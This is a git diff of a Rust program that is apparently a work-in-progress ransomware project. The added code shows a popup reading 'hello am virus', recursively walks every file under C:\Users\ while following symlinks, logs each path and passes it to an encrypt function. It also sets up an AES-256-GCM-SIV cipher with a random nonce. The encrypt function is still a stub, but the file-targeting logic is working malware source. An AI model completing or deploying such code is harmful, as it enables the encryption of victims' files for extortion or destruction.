@@ -20,15 +20,14 @@ use walkdir::{DirEntry, Error, WalkDir};
 fn main() {
     // create a popup on windows systems
 
-    for n in 1..3 {
-        // TODO: delete this testing code later
-        let cmd = Command::new("cmd")
-            .arg("/C")
-            .arg("start cmd /K echo hello am virus")
-            .spawn()
-            .expect("ruh roh");
-    }
+    let cmd = Command::new("cmd")
+        .arg("/C")
+        .arg("start cmd /K echo hello am virus")
+        .spawn()
+        .expect("ruh roh");
+
     // test_encryptfile();
+    traverse();
 }
 
 /**
@@ -132,38 +131,55 @@ fn test_encryptfile() {
  *
  * Notes: nonce is to make sure 2 identical plaintexts produce different output
  * counter is to make sure 2 identical blocks within the same plaintext produce different output
+ *
+ * Returns the cipher object
  */
-fn generate_key() {
-    //FIXME: change this later so the cipher + key is initialised once for all files.
-    //right now this is being use for only one file so its all in one function
-    //TODO: have this return the key
-    let rng = ChaCha20Rng::from_entropy();
+fn init_cipher() -> Aes256GcmSiv {
+    let mut rng = ChaCha20Rng::from_entropy();
     let mut nonce_array = [0u8; 12];
-    // rng.fill_bytes(dest)//FIXME: up to here
+    rng.fill_bytes(&mut nonce_array); //fill the nonce_array with random bytes. the actual rng happens here
+    let nonce = Nonce::from_slice(&nonce_array);
+
+    //FIXME: up to here. making the nonce
     let key = Aes256GcmSiv::generate_key(rng);
-    let cipher = Aes256GcmSiv::new(&key);
-    //TODO: generate a nonce
+    Aes256GcmSiv::new(&key)
 }
 
 /**
  * find all the files in subdirectories.
  * follow symlinks, don't skip hidden files
  *
- * TODO: does this return anythign?
+ * FIXME: this will probably mess up some system files, fix later
  */
 fn traverse() -> Result<(), Error> {
     //return result
     //search recursively through all directories and find files
-
-    //TODO: generate key here. one key to rule them all
+    let mut file = File::create("C:\\Users\\win11\\Desktop\\output.txt");
 
     for entry in WalkDir::new("C:\\Users\\").follow_links(true) {
-        let entry: DirEntry = entry?;
-        //iterate through all the files babey
-        println!("found file: {}", entry.path().display());
-        // encrypt(entry.path());
+        match entry {
+            Ok(entry) => {
+                writeln!(
+                    //this is just debug code
+                    file.as_ref().unwrap(),
+                    "found file: {}",
+                    entry.path().display()
+                );
+                encrypt(entry.path());
+            }
+            Err(e) => {
+                writeln!(file.as_ref().unwrap(), "Error: {}", e);
+            }
+        }
     }
     Ok(())
+}
+
+/**
+ * Encrypt a given file
+ */
+fn encrypt(path: &Path) {
+    let mut file = File::open(path).expect("can't open file");
 }
 
 /**
